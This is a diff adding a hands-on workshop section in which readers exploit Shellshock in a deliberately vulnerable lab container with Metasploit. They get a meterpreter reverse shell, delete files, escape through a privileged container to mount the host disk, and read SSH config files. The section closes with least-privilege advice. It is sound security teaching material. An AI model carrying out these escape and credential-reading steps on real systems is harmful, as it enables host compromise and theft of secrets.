@@ -90,9 +90,10 @@ check
 [.console-output]
 [source,bash,subs="+macros,+attributes"]
 ----
-
+[+] 127.0.0.1:8081 - The target is vulnerable.
 ----
 
+[#exploit_shellshock]
 === Exploiting Shellshock
 
 . Now it's time to exploit our running container.  This is as simple as running the following inside the metasploit console (it causes the `multi/http/apache_mod_bash_env_exec` module to be run with the configuration we set up in the previous section)
@@ -102,9 +103,280 @@ check
 ----
 exploit
 ----
++
+. After a few moments you should see the following output, ending with the a `meterpreter` console
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
 
-# TODO: Finish this section
+[-] Handler failed to bind to 13.239.27.229:4444:-  -
+[*] Started reverse TCP handler on 0.0.0.0:4444 
+[*] Command Stager progress - 100.46% done (1097/1092 bytes)
+[*] Sending stage (984904 bytes) to 13.239.27.229
+[*] Meterpreter session 1 opened (172.16.249.211:4444 -> 13.239.27.229:42046) at 2021-05-30 07:31:45 +0000
 
+meterpreter > 
+----
++
+. Next type in the following to get a shell and output something like the following
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+shell
+----
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+Process 79 created.
+Channel 1 created.
+----
++
+. And finally to make us maximally confortable during our hack, we can create a full `bash` shell experience by running this command
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+/usr/bin/script -qc /bin/bash /dev/null
+----
+
+[#wreaking_havoc]
+=== Wreaking havoc from within the container
+
+Now that we're in the container, let's show the kind of vulnerabilities we've exposed.  
+
+. First, notice the user we're running as: 
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+whoami
+----
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+root
+----
++
+. So we're running as the `root` user inside the container.  This is because we ran our container as root and setup our apache server to run as whichever user started the `httpd` process (in this case, `root`).
+. Now let's take a look at where we are in the container by issuing these two commands and reviewing the output (yours might vary slightly):
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+pwd && ls -l
+----
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+/var/www/cgi-bin
+total 4
+drwxr-xr-x. 1 root root  28 May 28 03:24 .
+drwxr-xr-x. 1 root root  18 May 17 15:31 ..
+-rwxr-xr-x. 1 root root 452 May 28 03:24 log-visitor.sh
+----
++
+. This is the script that logs visitors in our guestbook.  And notice that as root we have access to this script.  Feel free to look at the script 
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+cat log-visitor.sh
+----
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+include::example$log-visitor.sh[]
+----
++
+. Notice that the logbook directory is specified in the shell script.  We'll go there next.  But in the meantime we can damage the container by deleting the script
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+rm -f log-visitor.sh
+----
++
+. Now if you try to enter your name in the guestbook at the following URL (`http://localhost:8081/hello.html` in the *Preview Browser*) you'll now get an error
++
+[NOTE]
+.Ability to impact or sabotage running container
+====
+So far we've just impacted the running container.  To fix it we could just startup a new one.  But the vulnerabilities don't end there
+====
++
+image::broken-guestbook.png[]
++
+. One key consideration when running containers as a given user is that this generally maps directly to a user on the host operating system.  As we'll see, this is particularly dangerous for a user such as `root` which exists on every system and has elevated privileges.  One of the places of "interaction" between the container and the host operating system where we can exploit this is via the volume mounts we were using
+. Next let's poke around the directory where visitors were getting logged
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+cd /var/log/www && ls -l
+----
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+total 8
+-rw-r--r--. 1 1001 1001 73 May 28 08:50 README.md
+drwxr-xr-x. 2 1001 1001 22 May 28 08:50 cgi-bin
+drwxr-xr-x. 2 1001 1001 29 May 28 08:50 oval
+drwxr-xr-x. 2 1001 1001 34 May 28 08:50 sql
+-rw-r--r--. 1 root root  5 May 30 07:31 visitor_info.txt
+----
++ 
+. This is particularly concerning as you'll notice that this mirrors the files you see in the `container-workshop` directory of your host (as you can verify from the **Explorer**).  What's worse is that you are `root` so you can mess with stuff now in this directory (and below) of *the host system*.  For instance, enter the following commands
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+chown root README.md && chmod 700 README.md
+echo "You've been hax0red" >> visitor_info.txt && chmod a+w visitor_info.txt
+----
++
+. Now try to open README.md from your Explorer window and you'll see the following error in the bottom right corner of the VSCode Server window
++
+image::readme-error.png[]
++
+. If it's not open already, open the visitor_info.txt from the **Explorer**.  It will now look something like this: 
++
+image::hax0red.png[]
++
+[NOTE]
+.Access to host filesystem via volume mounts
+====
+This demonstrates that a malicious intruder could actually read and change files on the host system, provided access was afforded them through our volume mounts.  But it gets even worse in this case because of our use of the `privileged` flag.  This gives the container OS level capabilities, which we'll exploit to potentially devestating effect next
+====
++
+. Enter the following command to look at the disks(!) on the host operating system
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+fdisk -l
+----
++
+. The output you should see from the command is from the _host operating system_
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+WARNING: fdisk GPT support is currently new, and therefore in an experimental phase. Use at your own discretion.
+
+Disk /dev/xvda: 21.5 GB, 21474836480 bytes, 41943040 sectors
+Units = sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+Disk label type: gpt
+Disk identifier: 2E431796-24CD-41A3-A4CB-7987FFF67072
+
+
+#         Start          End    Size  Type            Name
+ 1         2048         4095      1M  BIOS boot       
+ 2         4096     41943006     20G  Linux filesyste 
+----
++
+. And now we can mount the root of the host filesystem by creating a directory and simply mounting the device at that directory
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+mkdir /mnt/hack
+mount /dev/xvda2 /mnt/hack
+touch /mnt/hack/hax0red.txt
+----
++
+. From within the container, validate that you're at the top of the host filesystem by issuing a `tree` command, you should see the whole of the VMs contents scroll by
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+cd /mnt/hack && tree
+----
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+.
+|-- bin -> usr/bin
+|-- boot
+|   |-- System.map-4.18.0-305.el8.x86_64
+|   |-- config-4.18.0-305.el8.x86_64
+|   |-- efi
+|   |   `-- EFI
+|   |       `-- redhat
+|   |-- grub2
+|   |   |-- device.map
+|   |   |-- fonts
+|   |   |   `-- unicode.pf2
+|   |   |-- grub.cfg
+|   |   |-- grubenv
+|   |   `-- i386-pc
+|   |       |-- acpi.mod
+|   |       |-- adler32.mod
+|   |       |-- affs.mod
+|   |       |-- afs.mod
+|   |       |-- ahci.mod
+|   |       |-- all_video.mod
+|   |       |-- aout.mod
+|   |       |-- appended_signature_test.mod
+...
+    |-- spool
+    |   |-- anacron
+    |   |   |-- cron.daily
+    |   |   |-- cron.monthly
+    |   |   `-- cron.weekly
+    |   |-- cron
+    |   |-- lpd
+    |   |-- mail
+    |   |   |-- ec2-user
+    |   |   `-- student1
+    |   `-- rhsm
+    |       `-- debug
+    |-- tmp
+    |   |-- cloud-init
+    |   |-- systemd-private-7dde33fba5c24ce9b2cf87368937522d-chronyd.service-iti2eg
+    |   |   `-- tmp
+    |   `-- systemd-private-7dde33fba5c24ce9b2cf87368937522d-nginx.service-NWeHPh
+    |       `-- tmp
+    `-- yp
+----
++
+. And from the left (VM) terminal, run the following command to show that a new file has been created on the host from within the container
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+ls -l /
+----
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+include::example$hacked_root.txt
+----
++
+. And finally, this means that any secrets on the host are exposed or manipulatable by the intruder
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+cat /mnt/hack/home/{USER}/.ssh/config
+----
+
+== Running containers responsibly
+
+Following the principle of least privilege, there is a lot we could have done to limit the damage of any attacker such as
+* don't run privileged containers
+* don't run containers as root
+* ensure that your containers do not include known vulnerabilities or CVEs
 
 == Scanning Containers
 
